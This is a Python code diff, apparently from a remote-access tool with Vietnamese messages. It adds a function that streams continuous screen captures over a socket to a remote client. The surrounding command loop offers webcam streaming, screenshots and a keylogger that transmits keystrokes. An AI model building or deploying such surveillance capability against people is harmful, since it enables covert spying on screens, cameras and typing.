@@ -131,6 +131,36 @@ def sleep():
         os.system("pmset sleepnow")
     else:
         print(f"OS '{current_os}' not supported for this command.")
+def share_screen(client_socket):
+    print('Bắt đầu chia sẻ màn hình liên tục...')
+    fps_target = 24
+    frame_duration = 1.0 / fps_target 
+
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        
+        while True:
+            start_time = time.time()
+            
+            screen_img = np.array(sct.grab(monitor))
+            frame = cv2.cvtColor(screen_img, cv2.COLOR_BGRA2BGR)
+            
+      
+            
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+            data = buffer.tobytes()
+            
+            message_size = struct.pack("L", len(data))
+            try:
+                client_socket.sendall(message_size + data)
+            except Exception as e:
+                print("Mất kết nối chia sẻ màn hình:", e)
+                break
+                
+            elapsed = time.time() - start_time
+            sleep_time = frame_duration - elapsed
+            if sleep_time > 0:
+                time.sleep(sleep_time)
 
 
 def share_screen(client_socket):
@@ -178,7 +208,7 @@ while cmd != 'exit':
         take_screenshot(client)
     elif cmd == 'stream':
         stream_webcam(client)
-    elif cmd == 'screen':
+    elif cmd == 'screen': 
         share_screen(client)
     elif cmd == 'keylogger':
         print("Monitoring keyboard and transmitting data... Press 'Esc' to exit.")
